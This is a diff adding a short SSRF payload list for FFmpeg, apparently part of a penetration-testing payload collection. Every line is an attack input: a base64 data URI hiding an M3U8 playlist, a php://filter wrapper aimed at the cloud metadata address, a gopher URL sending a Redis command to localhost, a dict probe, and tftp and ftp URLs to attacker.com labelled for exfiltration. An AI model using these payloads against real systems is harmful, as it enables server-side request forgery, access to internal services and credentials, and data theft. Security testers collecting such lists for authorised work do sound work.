@@ -1,0 +1,21 @@
+# FFmpeg Data URI and Protocol Wrappers
+# ======================================
+# Various ways to smuggle SSRF payloads through FFmpeg
+
+# Data URI with encoded M3U8
+data:application/vnd.apple.mpegurl;base64,I0VYVE0zVQojRVhULVgtTUVESUEtU0VRVUVOQ0U6VVJJPSJ ...
+
+# PHP wrapper style (if supported)
+php://filter/convert.base64-encode/resource=http://169.254.169.254/
+
+# Gopher for Redis/Memcached
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
+
+# Dict protocol for service detection
+dict://127.0.0.1:6379/INFO
+
+# TFTP for blind SSRF
+tftp://attacker.com/exfil
+
+# FTP for data exfiltration
+ftp://attacker.com/upload
